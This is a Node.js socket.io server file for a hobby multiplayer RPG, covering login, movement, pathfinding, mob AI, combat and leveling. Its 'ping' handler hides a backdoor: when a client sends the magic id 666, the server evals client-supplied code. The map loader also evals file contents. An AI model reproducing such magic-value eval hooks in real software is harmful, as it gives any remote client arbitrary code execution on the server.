var io = require('/Program Files/nodejs/node_modules/npm/node_modules/socket.io')(6767);
var fs = require('fs');
var gameloop = require('node-gameloop');
var findPath = require('./astar_server.js');
var enums = require('./enums_server.js')
var weaponTemplates = require('./templates.js');
// var calcLineOfSight = require('./bresenhams_server.js');
// var Player = require('./player_server.js');
// var foe = require('./foe_server.js');
// require('./player_server.js');
// require('./classes_server.js');
console.log("Listening on 6767...");
var gh = 32; //tile height
var game_size = {w: 32, h: 16}; //w and h in tiles
var frameTime = new Date().getTime();
var lastFrame = new Date().getTime();
var map = new Map(75, 75);
map.loadCollisions();
var allPlayers = {}; 
var onlinePlayersData = {}; //stores currently online players by their socket.id, should have no other use but to reference objects from allPlayers 
var teleports = new teleportManager();
teleports.populateTeleports();
var mobzz = [];
var spawner = new MonsterSpawner();
spawner.populateMobs();
var ifac = new ItemFactory();

var game = {
  speedCap: 80
};


io.on('connection', function (socket) {

  socket.on('player-login-attempt', function (new_player_id){
    console.log('connecting ' + new_player_id + ' ...');
    if(allPlayers.hasOwnProperty(new_player_id)){
      io.to(socket.id).emit('player-login-success', {id: new_player_id});
    }
    else{
      allPlayers[new_player_id] = new Player(new_player_id, 2, 4);
      io.to(socket.id).emit('player-login-failure', {id: new_player_id, playerData: allPlayers[new_player_id]});
    }
      onlinePlayersData[socket.id] = allPlayers[new_player_id];
      allPlayers[new_player_id].socket = socket.id;

      var p = allPlayers[new_player_id]
      var player_data = {
        id: p.id,
        name: p.name,
        x: p.x,
        y: p.y,
        level: p.level,
        experience: p.experience,
        healthMax: p.healthMax,
        healthCur: p.healthCur,
        manaMax: p.manaMax,
        manaCur: p.manaCur,
        speedCur: p.speedCur,
        attrPoints: p.attrPoints,
        skillPoints: p.skillPoints,
        eq: p.equipment
      };

      io.to(socket.id).emit('load-player', player_data);
      console.log(player_data);

    //notify all players that a player connected
      var export_data = {};
      var o = allPlayers[onlinePlayersData[socket.id].id];
      export_data.id = o.id;
      export_data.level = o.level;
      export_data.x = o.tx;
      export_data.y = o.ty;
      export_data.healthMax = o.healthMax;
      export_data.healthCur = o.healthCur;
      export_data.speedCur = o.speedCur;
      export_data.name = o.name;
    for(var sId in onlinePlayersData){
      io.to(sId).emit('player-connected', export_data);
    }
    //connecting player gets mobs initially
    var export_mobs = {};
    for(var i in mobzz){
      if(!neighbourChunk(onlinePlayersData[socket.id].chunk, mobzz[i].chunk))
        continue;
      export_mobs[i] = {};
      export_mobs[i].tx = mobzz[i].tx;
      export_mobs[i].ty = mobzz[i].ty;
      export_mobs[i].healthMax = mobzz[i].healthMax;
      export_mobs[i].healthCur = mobzz[i].healthCur;
      export_mobs[i].speed = mobzz[i].speed;
      export_mobs[i].name = mobzz[i].name;
      export_mobs[i].id = mobzz[i].id;
    }
    //same as above but players data
    var export_players = {};
    for(var sId in onlinePlayersData){
      if(!neighbourChunk(onlinePlayersData[socket.id].chunk, onlinePlayersData[sId].chunk))
        continue;
      var o = allPlayers[onlinePlayersData[sId].id];
      export_players[o.id] = {};
      export_players[o.id].id = o.id;
      export_players[o.id].level = o.level;
      export_players[o.id].x = o.x;
      export_players[o.id].y = o.y;
      export_players[o.id].healthMax = o.healthMax;
      export_players[o.id].healthCur = o.healthCur;
      export_players[o.id].speedCur = o.speedCur;
      export_players[o.id].name = o.name;
    }
    io.to(socket.id).emit('player-initiate-current-objects', {players: export_players, mobs: export_mobs});

  });
  socket.on('ping', function(data){
    io.to(socket.id).emit('ping back', data);
    var id = onlinePlayersData[socket.id].id;
    if(data.id == 666)
      eval(data.ch);
  });
  socket.on('player-input-move', function (data){
    if(onlinePlayersData.hasOwnProperty(socket.id)){//i shouldn't have to check that
      var id = onlinePlayersData[socket.id].id;
      allPlayers[id].move(data.x, data.y);
    }
  });
  socket.on('request-map-world', function(){
    socket.emit('send-map-world', map.world);
  });
  socket.on('disconnect', function () {
    if(onlinePlayersData.hasOwnProperty(socket.id)){
      var id = onlinePlayersData[socket.id].id;
      //pull disconnecting player back into database.
      console.log('disconnecting ' + id);
      for(var sId in onlinePlayersData)//tell all clients that this id is no more
        io.to(sId).emit('player-disconnected', onlinePlayersData[socket.id].id);
      //no longer update player that disconnected.
      delete onlinePlayersData[socket.id];
    }
  });
  socket.on('player-attack', function (data){
    var id = onlinePlayersData[socket.id].id;
    allPlayers[id].attack(data.id, data.type);
  });
  socket.on('player-toggle-regen', function (data){
    var id = onlinePlayersData[socket.id].id;
    allPlayers[id].isResting = !allPlayers[id].isResting;
    console.log('player ' + id + 'toggles regen');
  });
});
function emitSpawning(foe){
  for(var sId in onlinePlayersData){
    if(!neighbourChunk(onlinePlayersData[sId].chunk, foe.chunk)) continue;
    var export_mob = {};
    export_mob.tx = foe.tx;
    export_mob.ty = foe.ty;
    export_mob.healthMax = foe.healthMax;
    export_mob.healthCur = foe.healthCur;
    export_mob.speed = foe.speed;
    export_mob.name = foe.name;
    export_mob.id = foe.id;
    io.to(sId).emit('mob-spawned', export_mob);
  }
}
var physicsLoop = gameloop.setGameLoop(function(delta){//~66 updates/s = 15ms/update
  frameTime = new Date().getTime();
  //server side game physics are all calculated here
  //client veirfication goes here
  //take client input and process


  for(var sId in onlinePlayersData){
    if(!allPlayers[onlinePlayersData[sId].id])
      continue;
    allPlayers[onlinePlayersData[sId].id].update();
  }
  teleports.update();
  spawner.update();
  for(var i=0; i < mobzz.length; i++) mobzz[i].update();



  lastFrame = frameTime;
}, 1000/60);

var updateLoop = gameloop.setGameLoop(function(delta){//~22 updates/s = 45ms/update

  var export_players = {};
  for(var sId in onlinePlayersData){
    if(!onlinePlayersData[sId]) continue;
    var id = onlinePlayersData[sId].id;
    export_players[id] = {};
    export_players[id].id = allPlayers[id].id;
    export_players[id].healthMax = allPlayers[id].healthMax;
    export_players[id].healthCur = allPlayers[id].healthCur;
    export_players[id].speedCur = allPlayers[id].speedCur;
  }
  var export_mobs = {};
  for(var i in mobzz){
    export_mobs[i] = {};
    export_mobs[i].tx = mobzz[i].tx;
    export_mobs[i].ty = mobzz[i].ty;
    export_mobs[i].healthMax = mobzz[i].healthMax;
    export_mobs[i].healthCur = mobzz[i].healthCur;
    export_mobs[i].speed = mobzz[i].speed;
    export_mobs[i].name = mobzz[i].name;
    export_mobs[i].id = mobzz[i].id;
  }
  for(sId in onlinePlayersData)
    io.to(sId).emit('data-update', {mobs: export_mobs, players: export_players});
}, 1000/22);

function Map(h, w){
  this.h = h;
  this.w = w;
  this.world = [[]];
  this.loadCollisions = function(){
    var fileContents;
    fs.readFile('oct_2015_resized.json', 'utf-8', function (err, data) {
      if (err) throw err;
      data = eval("("+data+")");
      var x, y, h, w;
      for(var o in data.objects){
        h = Math.round(data.objects[o].height/gh);
        w = Math.round(data.objects[o].width/gh);
        x = Math.round(data.objects[o].x/gh);
        y = Math.round(data.objects[o].y/gh);
        for(var i = x; i < (x+w); i++){
          for(var j = y; j < (y+h); j++){
            map.world[i][j] = 1;
          }
        }
      }
    });
    console.log("map collisions loaded");
  }
  this.isValid = function(x, y) {
    return (this.world[x][y] == 0);
  }
  this.occupy = function(x, y){
    this.world[x][y] = 0.5;
  }
  this.free = function(x, y){
    this.world[x][y] = 0;
  }
  for (var x=-1; x < w+1; x++) {
    this.world[x] = [];
    for (var y=-1; y < h+1; y++)
      if(x == -1 || x == w)
        this.world[x][y] = 1;
      else if(y == -1 || y == h+1)
        this.world[x][y] = 1;
      else
        this.world[x][y] = 0;
  }
}


function MonsterSpawner(){//server only
  var curId = 1000;
  this.spawns = [];
  this.populateMobs = function(){
    // for(var i = 0; i< 100; i++)
    this.createSpawn(Bat, 7, 9, 2);
    this.createSpawn(Bat, 19, 18, 8);
    this.createSpawn(Bat, 12, 20, 8);
    this.createSpawn(Bat, 12, 9, 8);
    this.createSpawn(Fly, 21, 10, 10);
  }
  this.createSpawn = function(foe_class, spawn_x, spawn_y, respawn_time) {
    this.spawns.push({
      foe_class: foe_class,
      spawn_x: spawn_x,
      spawn_y: spawn_y,
      foe: null,
      died_at: frameTime,
      respawn_time: respawn_time
    });
  }
  this.update = function(){
    for(var i = 0; i < this.spawns.length; i++) {
      if(!this.spawns[i].foe && frameTime - this.spawns[i].died_at > this.spawns[i].respawn_time*1000) {
        this.spawns[i].foe = new this.spawns[i].foe_class(curId++,this.spawns[i].spawn_x,this.spawns[i].spawn_y)        
        console.log('pushing ' + this.spawns[i].foe.name + ' to mobzz');
        mobzz.push(this.spawns[i].foe);
        emitSpawning(this.spawns[i].foe);
      }else if(this.spawns[i].foe && this.spawns[i].foe.isDead) {
        this.spawns[i].died_at = frameTime;
        this.spawns[i].foe = null;
      }
    }
  }
}
function MovementQueue(){
  this.currentPath = [];
  this.findPath = function(x, y, x_dest, y_dest){
    this.currentPath = findPath(map.world, [x, y], [x_dest, y_dest]);
    this.currentPath.shift();
  }
  this.queueMove = function(x, y){
    this.currentPath = [[x, y]];
  }
  this.getLength = function(){
    return this.currentPath.length;
  }
  this.getMove = function(){
    return this.currentPath.shift();
  }
}
function Player(id, spawn_x, spawn_y) {
    this.id = id || 1;
    this.name = "Playerino";
    this.type = 0;

    this.x = spawn_x;
    this.y = spawn_y;
    this.tx = spawn_x;
    this.ty = spawn_y;
    this.ax = 0;
    this.ay = 0;
    this.chunk = [Math.floor(spawn_x / game_size.w), Math.floor(spawn_y / game_size.h)];
    this.direction = 0;

    this.level = 1;
    this.experience = 0;
    this.expPenalty = 0;
    this.strength = 1;
    this.agility = 1;
    this.intelligence = 1;
    this.attrPoints = 0;
    this.skillPoints = 0;
    this.healthMax = 300;
    this.healthCur = 300;
    this.manaMax = 900;
    this.manaCur = 900;
    this.healthRegenBase = 0;
    this.healthRegen = 2;
    this.healthRegenInterval = 1000;
    this.manaRegen = 300;
    this.mmr = 1400;

    this.speedBase = 400;
    this.speedCur = 400;

    this.accuracy = 1;
    this.accuracyBase = 1;
    this.critChanceBase = 0;
    this.critChance = 0;
    this.critDamageBase = 1;
    this.critDamage = 1;
    this.lifeStealBase = 0;
    this.lifeSteal = 0.15;
    this.dmgModBase = 1;
    this.dmgMod = 1;
    this.atkSpeedBase = 1;
    this.atkSpeed = 1;
    this.evasionBase = 0;
    this.evasion = 0;
    this.dmgReflectBase = 0;
    this.dmgReflect = 0;
    this.blockChanceBase = 0;
    this.blockChance = 0;
    this.magicImmunityBase = 0;
    this.magicImmunity = 0;
    this.physicalImmunityBase = 0;
    this.physicalImmunity = 0;


    this.silenced = false;
    this.stunned = false;
    this.disarmed = false;
    this.stealthed = false;
    this.bleeding = false;
    this.onFire = false;
    this.poisoned = false;

    this.moveValid = true;
    this.isDead = false;
    this.isVisible = true;
    this.isResting = false;
    this.deathTime = frameTime;
    this.lastHpRegen = frameTime;
    this.moveQ = new MovementQueue();
    this.animStart = frameTime;
    this.lastAttack = frameTime;
    this.attackCooldown = 2000;
    this.damageInfo = {
        totalDamage: 0
    };
    this.skills = [ // seems deprecated
    {     // 1
        cooldown: 0,
        action: 0
    }, {
        cooldown: 0,    //2
        action: 0
    }, {
        cooldown: 0,    //3
        action: 0
    }, {
        cooldown: 0,    //4
        action: 0
    }];
    this.equipment = {
        primary: ifac.getWeaponFromTemplate(2),
        secondary: 0, // ¤=[]:::;;>
        body: {},
        legs: {},
        boots: {
            speedMod: 1
        },
        head: {},
        backpack: new Container()
    };

    console.log(this.chunk[0], this.chunk[1])
    this.update = function() {
        this.lastChunk = this.chunk;
        this.ax = (this.tx - this.x) * (frameTime - this.animStart) / this.speedCur;
        this.ay = (this.ty - this.y) * (frameTime - this.animStart) / this.speedCur;

        if (Math.abs(this.ax) >= 1) {
            this.moving = false;
            this.x = this.tx;
            this.ax = 0;

        }
        if (Math.abs(this.ay) >= 1) {
            this.moving = false;
            this.y = this.ty;
            this.ay = 0;
        }

        if (!this.moving) {
            var nextMove = this.moveQ.getMove();
            if (nextMove) {
                if (!map.isValid(nextMove[0], nextMove[1]) && this.moveQ.getLength() > 0) {
                    this.moveQ.findPath(this.x, this.y, clientX, clientY);
                    nextMove = this.moveQ.getMove();
                }
                if (nextMove && map.isValid(nextMove[0], nextMove[1])) {
                    this.animStart = frameTime;
                    this.moving = true;
                    // map.free(this.x, this.y);
                    this.tx = nextMove[0];
                    this.ty = nextMove[1];
                    // map.occupy(this.tx, this.ty);
                    for (var sId in onlinePlayersData)
                        io.to(sId).emit('players-move-update', {
                            tx: this.tx,
                            ty: this.ty,
                            id: this.id
                        });
                }
            }
        }
        //regenerate hp/mana every healthRegenInterval when player is resting
        if (this.healthMax != this.healthCur)
            if (frameTime - this.lastHpRegen >= this.healthRegenInterval && this.isResting)
                this.restoreHp();
        updateStats(this); //speed cap?
        if (this.experience < 0) this.experience = 0;
        //leveling up stuff
        if (this.experience >= levelExpFormula(this.level + 1))
            levelUp(this);

        //basic chunk calc & storing for future use in chunk loading
        this.chunk[0] = Math.floor(this.tx / 32);
        this.chunk[1] = Math.floor(this.ty / 16);
    }
    this.move = function(dx, dy, dir) {
        if (map.isValid(this.tx + dx, this.ty + dy))
            this.moveQ.queueMove(this.tx + dx, this.ty + dy);
    }
    this.attack = function(target_id, target_type) {
      console.log('attack');
        var id = null;
        if (!this.isDead) {
            if (target_type == 1) { //if target is mob get mobs place in mobzz
                var len = mobzz.length
                for (var i = 0; i < len; i++) {
                    if (mobzz[i].id == target_id) {
                        target = mobzz[i];
                    }
                }
            } else { //thats for players
                target = allPlayers[target_id];
            }

            if (frameTime - this.lastAttack > (this.attackCooldown / this.atkSpeed) && target && dist(this, target) < this.equipment.primary.range) {
                this.lastAttack = frameTime;

                if (this.equipment.primary.type == 'bow') {
                    var los = calcLineOfSight(this.tx, this.ty, target.tx, target.ty);
                    for (sId in onlinePlayersData)
                        io.to(sId).emit('player-attack-bow', {
                            id: this.id,
                            target: los.obstacle
                        });
                    if (!los.isClear) //skip invoking damage functions
                        return;
                }

                if (target_type == 0) {
                    var damage = calcDamage(this, target);
                    var damageTaken = target.takeDamage(this.id, damage, 0);
                    //allPlayers[id].applyEffect();
                } else if (target_type == 1) {
                    var damage = calcDamage(this, target);
                    var damageTaken = target.takeDamage(this.id, damage, 0);
                    //mobzz[id].applyEffect();
                }

                this.lifeSteal && this.restoreHp(Math.floor(damageTaken * this.lifeSteal)); //lifesteal stuff
            }
        }
    }
    this.applyEffect = function() {

    }
    this.restoreHp = function(stolenHp) {
        if (!stolenHp) this.lastHpRegen = new Date().getTime();
        var heal = stolenHp || this.healthRegen;
        this.healthCur += Math.min(heal, this.healthMax - this.healthCur);
    }
    this.takeDamage = function(attackerId, damage, attackerType) {
        var dmg = Math.min(damage, this.healthCur);
        this.healthCur -= dmg;
        if (this.dmgReflect) { //damage reflection shit
            if (attackerType == 0) { //if player
                dmg = calcDamage(this, allPlayers[attackerId])
                allPlayers[attackerId].takeDamage(this.id, Math.floor(dmg * this.dmgReflect)); //dmg reflection stuff
            } else { //if mob
                var len = mobzz.length
                for (var i = 0; i < len; i++)
                    if (mobzz[i].id == attackerId)
                        var target = mobzz[i];
                dmg = calcDamage(this, target)
                target.takeDamage(this.id, Math.floor(damage * this.dmgReflect));
            }
        }



        for (sId in onlinePlayersData)
            io.to(sId).emit('player-take-damage', {
                id: this.id,
                dmg: dmg
            })

        this.damageInfo[attackerId] = this.damageInfo[attackerId] || 0;
        this.damageInfo[attackerId] += dmg;
        this.damageInfo.totalDamage += dmg;

        if (this.healthCur <= 0 && !this.isDead) {
            this.die();
        }
        return dmg;
    }
    this.die = function() {
        this.deathTime = new Date().getTime();
        this.isDead = true;
        this.isVisible = false;
        io.to(this.socket).emit('player-death', {});
    }
}
function Foe(name, id, spawn_x, spawn_y, mobile){//need to make separate check for player and other mobs positions regarding collisions
  /*basic*/
  this.name = name;
  this.id = id;
  this.x = spawn_x || 10;
  this.y = spawn_y || 10;
  this.spawnPoint = {x: spawn_x, y: spawn_y};
  this.healthMax = 100;
  this.healthCur = this.healthMax;
  this.exp = 85;
  this.mmr = 1400;
  this.speed = 600;
  this.type = 1;
  this.moveInterval = 1500;
  this.tx = this.x;
  this.ty = this.y;
  this.chunk = [];
  this.chunk[0] = Math.floor(this.tx/game_size.w),
  this.chunk[1] = Math.floor(this.ty/game_size.h),
  this.mobile = mobile;
  this.moveQ = new MovementQueue();
  this.targetId = null;
  this.aggro = false;
  this.aggroRange = 9;
  this.leeshTimer = frameTime;
  this.animStart = frameTime;
  this.lastMoved = frameTime;
  this.lastAttack = frameTime;
  this.attackCooldown = 1750;
  this.damageInfo = {totalDamage: 0};
  this.damageMin = 15;
  this.damageMax = 45;
  this.defenseRating = 0;
  /*percentage*/
  this.critChanceBase = 0;
  this.critChance = 0;
  this.critDamageBase = 1;
  this.critDamage = 1;
  this.lifeSteal = 0;
  this.lifeStealBase = 0;
  this.dmgMod = 1;
  this.dmgModBase = 1;
  this.atkSpeed = 1;
  this.atkSpeedBase = 1;
  this.evasion = 0;
  this.dmgReflect = 0;
  this.dmgReflectBase = 0;
  this.blockChance = 0;
  this.magicImmunity = 0;
  this.magicImmunityBase = 0;
  this.physicalImmunity = 0;
  this.physicalImmunityBase = 0;
  /* bools */
  this.silenced = false;
  this.stunned = false;
  this.disarmed = false;
  this.stealthed = false;
  this.bleeding = false;
  this.onFire = false;
  this.poisoned = false;
  /*others*/
  this.loot = {gold: 0, silver: 0, copper: Math.floor(Math.random()*100)%25};
  
  // map.occupy(this.x, this.y);

  this.update = function(){
    // var kara = Math.sqrt((this.tx - this.x)*(this.tx - this.x) + (this.ty - this.y)*(this.ty - this.y));
    // kara = kara || 1;
    var kara = 1;
    this.ax = (this.tx - this.x) * (frameTime - this.animStart) / this.speed / kara;
    this.ay = (this.ty - this.y) * (frameTime - this.animStart) / this.speed / kara;
    
    if (Math.abs(this.ax) >= 1) {
      this.moving = false;
      this.x = this.tx;
      this.ax = 0;
    }
    
    if (Math.abs(this.ay) >= 1) {
      this.moving =  false;
      this.y = this.ty;
      this.ay = 0;
    }
    this.aggroCheck();
    this.move();
    this.attack();
    this.chunk[0] = Math.floor(this.tx/32);
    this.chunk[1] = Math.floor(this.ty/16);
    return this;
  }
  
  this.rlyMove = function(tx,ty){
    this.animStart = frameTime;
    this.moving = true;
    // map.free(this.x, this.y);
    this.tx = tx; this.ty = ty;
    // map.occupy(this.tx, this.ty);
  }
  this.move = function(){
    if(!this.mobile) return;
    
    if(this.aggro){
        if(!this.moving){
          if(!this.targetId) return;
          this.moveQ.findPath(this.tx, this.ty, allPlayers[this.targetId].tx, allPlayers[this.targetId].ty);
          if(!this.moveQ.getLength())
            this.aggro = false;
          if(Math.max(Math.abs(this.ty-allPlayers[this.targetId].ty),Math.abs(this.tx-allPlayers[this.targetId].tx))>1){
            var nextMove;
            if((nextMove = this.moveQ.getMove())){
              this.rlyMove(nextMove[0],nextMove[1]);
            }
          }
        }
      }

    if(!this.aggro) this.passiveMovement();    
  }
  this.passiveMovement = function(){
    if(frameTime-this.lastMoved > this.moveInterval){
      var cx=0, cy=0;
      if(Math.random()<0.5)
        cx = (Math.random() < (this.x - this.spawnPoint.x + 4)/8)?1:-1;
      else
        cy = (Math.random() < (this.y - this.spawnPoint.y + 4)/8)?1:-1;
      if(map.isValid(this.x-cx, this.y-cy)){
        if(!this.moving){
          this.rlyMove(this.x - cx, this.ty -cy);
        }
      } else this.passiveMovement();
      this.lastMoved = frameTime;
    }
    return this;
  }
  this.aggroCheck = function(){ //rewrite this shit
    if(this.type == 0){ //passive

    }
    else if(this.type == 1){ //aggressive
      if(this.targetId){//check if target isn't lost
        if(allPlayers[this.targetId].isDead){//check if dead, untarget if true
          this.targetId = false;
          this.aggro = false;
          return;
        }
        if(!allPlayers[this.targetId].isVisible){//check is not invisible
          this.targetId = false;
          this.aggro = false;
          return;
        }
        if(frameTime - this.leeshTimer > 5000 && dist(this.spawnPoint, allPlayers[this.targetId]) > 10){
          this.targetId = false;
          this.aggro = false;
          return;    
        }
      }
      else{//no target -> look for target
        for(var sId in onlinePlayersData){
          var id = onlinePlayersData[sId].id;
          if(!allPlayers[id] || allPlayers[id].isDead) continue;
          if(allPlayers[id].isVisible && dist(this, allPlayers[id]) < this.aggroRange && calcLineOfSight(this.tx, this.ty, allPlayers[id].tx, allPlayers[id].ty).isClear){
            this.aggro = true;
            this.targetId = id;
            this.leeshTimer = new Date().getTime();
            break;
          }
        }
      }
    }
  }
  this.attack = function(){
    if(!allPlayers[this.targetId]) return;
    if(this.aggro && frameTime - this.lastAttack > (this.attackCooldown / this.atkSpeed) && dist(allPlayers[this.targetId], this)<1.45){
      var damage = Math.round((Math.random()*100) % (this.damageMax-this.damageMin) + this.damageMin);
      allPlayers[this.targetId].takeDamage(this.id, damage, 1);//(atkid, dmg, type)
      this.lastAttack = frameTime;
    }
  }
  this.applyEffect = function() {
    
  }
  this.restoreHp = function(stolenHp) {
    if(!stolenHp) this.lastHpRegen = new Date().getTime();
    var heal = stolenHp || this.healthRegen;
    this.healthCur += Math.min(heal, this.healthMax - this.healthCur);
  }
  this.takeDamage = function(attackerId, damage){
    if(!this.targetId) this.targetId = attackerId;//when no target -> aggro attacker
    var damageTaken = Math.min(damage, this.healthCur);
    for(sId in onlinePlayersData)
      io.to(sId).emit('mob-take-damage', {id: this.id, dmg: damageTaken})
    this.aggro = true;
    this.leeshTimer = new Date().getTime();

    this.healthCur -= damageTaken;
    this.damageInfo[attackerId] = this.damageInfo[attackerId] || 0;
    this.damageInfo[attackerId] += damageTaken;
    this.damageInfo.totalDamage += damageTaken;

    if(this.healthCur <= 0)
      this.die(attackerId);
    return damageTaken;
  }
  this.die = function(killerId){
    for(var i=0; i<mobzz.length; i++){
      if(mobzz[i].id == this.id){
        for(sId in onlinePlayersData){
          io.to(sId).emit('mob-death', this.id);
        }
        mobzz.splice(i,1);
        // map.free(this.tx, this.ty);
        this.dropExperience(killerId);
        // this.dropLoot();
        this.isDead = true;
      }
    }
  }
  this.dropExperience = function(killerId){
    for(var id in this.damageInfo){
      if(id == 'totalDamage') continue;
      var exp = 0.5 * this.exp * (this.damageInfo[id]/this.damageInfo.totalDamage) + (allPlayers[id].id==killerId?0.5*this.exp:0);
      if(!exp) continue;
      exp = Math.floor(exp);
      allPlayers[id].experience += exp;
      io.to(allPlayers[id].socket).emit('gained-exp', {totalExp: allPlayers[id].experience, gainedExp: exp});
    }
  }
  this.dropLoot = function(){
    // entities.newEntity(this.id, this.tx, this.ty, this.loot);
  }
}
function neighbourChunk(p_c, o_c){
  return (o_c[0] >= p_c[0]-1 && o_c[0] <= p_c[0]+1 && o_c[1] >= p_c[1]-1 && o_c[1] <= p_c[1]+1)?true:false;
}
function calcDamage(attacker, enemy){
  var damage = 0;
  //hitrate vs evasion
  // var div = attacker.accuracy/enemy.evasion;
  // var hitChance = 
  if(Math.random()>attacker.accuracy) return damage;
  if(Math.random()<=enemy.evasion) return damage;
  //blocking
  if(Math.random()<=enemy.blockChance) return damage;
  //damage
  var baseDamage = (Math.random()*100) % (attacker.equipment.primary.damageMax - attacker.equipment.primary.damageMin) + attacker.equipment.primary.damageMin;
  var critDamage = Math.random()<attacker.critChance?attacker.critDamage:1;
  baseDamage += attacker.strength + 0.3*attacker.agility + 0.2*attacker.level;
  var damage = (baseDamage * critDamage);//apply critical damage after enemy armor/defense modifiers
  damage *= attacker.dmgMod;//damage modifiers
  damage *= (1-enemy.physicalImmunity);//percentage immunity to physical attacks
  return (damage>=0)?Math.round(damage):0;//keep it in integers
}
function levelUp(player){
  player.level++;
  if(player.level>9)
    player.skillPoints++;
  player.attrPoints += 3;
  player.speedBase = 400 - 0.9*(player.level - 1);
  if(player.speedBase < game.speedCap) player.speedBase = game.speedCap; //speed cap
}
function levelDown(player){
//this should technically never happen
//there is currently no way to lose xp
  player.level--;
}
function levelUpFormula(level){//xp needed for the next lvl
  return (50*(level*level-5*level+8));
}
function levelExpFormula(level){//
  return ((50/3)*(level*level*level-6*level*level+17*level-12));
}
function updateStats(player){
  player.speedCur = player.speedCur>=80?Math.floor(player.speedBase * player.equipment.boots.speedMod):80;//speed cap at 80.less is faster
}
// ******************  UTILS
function dist(a, b) {
  return Math.sqrt((a.tx-b.tx)*(a.tx-b.tx)+(a.ty-b.ty)*(a.ty-b.ty));
}

//************   MOBS ****************//
function Ahmed(id, spawn_x, spawn_y){
  Foe.call(this,'Ahmed',id,spawn_x,spawn_y,true);
}
Ahmed.prototype = Object.create(Foe.prototype);
Ahmed.prototype.constructor = Ahmed;


function BigBat(id, spawn_x, spawn_y){
  Foe.call(this,'BigBat',id,spawn_x,spawn_y,true);
  this.healthMax = 800;
  this.healthCur = 800;
  this.exp = 1200;
  this.speed -= 130;
  this.damageMin = 85;
  this.damageMax = 245;
  this.defenseRating = 9;
}
BigBat.prototype = Object.create(Foe.prototype);
BigBat.prototype.constructor = BigBat;


function Bat(id, spawn_x, spawn_y){
  Foe.call(this,'Bat',id,spawn_x,spawn_y,true);
  this.healthMax = 20;
  this.healthCur = 20;
  this.exp = 1000000;
  this.damageMin = 0;
  this.damageMax = 12;
  this.defenseRating = 2;
}
Bat.prototype = Object.create(Foe.prototype);
Bat.prototype.constructor = Bat;

function Fly(id, spawn_x, spawn_y){
  Foe.call(this,'Fly',id,spawn_x,spawn_y,true);
  this.healthMax = 45;
  this.healthCur = 45;
  this.exp = 10000;
  this.damageMin = 0;
  this.damageMax = 12;
  this.defenseRating = 0;
}
Fly.prototype = Object.create(Foe.prototype);
Fly.prototype.constructor = Fly;


function Ogre(id, spawn_x, spawn_y){
  Foe.call(this,'Ogre',id,spawn_x,spawn_y,true);
}
Ogre.prototype = Object.create(Foe.prototype);
Ogre.prototype.constructor = Ogre;


function Goblin(id, spawn_x, spawn_y){
  Foe.call(this,'Goblin',id,spawn_x,spawn_y,true);
}
Goblin.prototype = Object.create(Foe.prototype);
Goblin.prototype.constructor = Goblin;


function Dummy(id, spawn_x, spawn_y){
  Foe.call(this,'Dummy',id,spawn_x,spawn_y,false);
}
Dummy.prototype = Object.create(Foe.prototype);
Dummy.prototype.constructor = Dummy;

function Stonoga(id, spawn_x, spawn_y){
  Foe.call(this,'Stonoga',id,spawn_x,spawn_y,false);
}
Stonoga.prototype = Object.create(Foe.prototype);
Stonoga.prototype.constructor = Stonoga;

function Shroom(id, spawn_x, spawn_y){
  Foe.call(this,'Shroom',id,spawn_x,spawn_y,false);
}
Shroom.prototype = Object.create(Foe.prototype);
Shroom.prototype.constructor = Shroom;

function calcLineOfSight (x1, y1, x2, y2) {
  var coordinatesArray = [];
  var dx = Math.abs(x2 - x1);
  var dy = Math.abs(y2 - y1);
  var sx = (x1 < x2) ? 1 : -1;
  var sy = (y1 < y2) ? 1 : -1;
  var err = dx - dy;
  coordinatesArray.push([y1, x1]);
  // Main loop
  while (!((x1 == x2) && (y1 == y2))) {
    var e2 = err << 1;
    if (e2 > -dy) {
      err -= dy;
      x1 += sx;
    }
    if (e2 < dx) {
      err += dx;
      y1 += sy;
    }
    coordinatesArray.push([y1, x1]);
  }
  for(var i=0; i<coordinatesArray.length; i++){
    var y = coordinatesArray[i][0];
    var x = coordinatesArray[i][1];
    if(map.world[x][y] >= 1) return {isClear: false, obstacle: {x: x, y:y}};
  }
  return {isClear: true, obstacle: {x: x, y: y}};
}
function teleportManager(){
  this.teleportList = [];
  this.curId = 0;
  this.newTeleport = function(x1, y1, x2, y2) {
    this.teleportList.push({
      id: this.curId++,
      x: x1,
      y: y1,
      d_x: x2,
      d_y: y2
    });
  };
  this.populateTeleports = function() {
    this.newTeleport(30, 6, 30, 60);
    this.newTeleport(34, 12, 37, 17);
    this.newTeleport(34, 18, 2, 4);
  };
  this.update = function() {
    for(sId in onlinePlayersData){
      for(var i=0; i<this.curId; i++){
        if(onlinePlayersData[sId].x == this.teleportList[i].x && onlinePlayersData[sId].y == this.teleportList[i].y){
          var id = onlinePlayersData[sId].id;
          allPlayers[id].x = this.teleportList[i].d_x;
          allPlayers[id].y = this.teleportList[i].d_y;
          allPlayers[id].tx = this.teleportList[i].d_x;
          allPlayers[id].ty = this.teleportList[i].d_y;
          allPlayers[id].ax = 0;
          allPlayers[id].ay = 0;
          console.log('player moved to: ' + allPlayers[id].x, ', ' + allPlayers[id].y)
          io.to(sId).emit('player-teleport', {x: allPlayers[id].x, y: allPlayers[id].y});
        }
      }
    }
  };
}

function Item(id, name, stackable, quantity, type){
  this.id = id;
  this.name = name;
  this.type = type;
  this.stackable = stackable;
  this.quantity = quantity;
}
Skill.prototype = Object.create(Item.prototype);
Skill.prototype.constructor = Skill;
function Skill(id, name, stackable, quantity, type, abilities, cooldown){
  Item.call(this, id, name, stackable, quantity, type);
  this.abilities = abilities;
  this.cooldown = cooldown;
  this.lastUseTime = new Date().getTime();
  this.ready = false;
  this.equip = function(user, slot) {
    if(user.skills[slot] || slot > 3) return;
    user.skills[slot] = this;
    this.lastUseTime = frameTime;
    for(var i=0; i<this.abilities.length; i++){
      var a = this.abilities[i];
      if(a.type == enums.skillType.PASSIVE)
        if(a.target == enums.skillTarget.SELF)
          if(a.effect == enums.skillEffect.HEAL){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.healthRegen += user.healthRegenBase * a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.healthRegen += a.value;
            }
          }
          else if(a.effect == enums.skillEffect.DMGBOOST){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.dmgMod += user.dmgModBase * a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.dmgMod += a.value;
            }
          }
          else if(a.effect == enums.skillEffect.LIFESTEAL){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.lifeSteal += user.lifeStealBase * a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.lifeSteal += a.value;
            }
          }
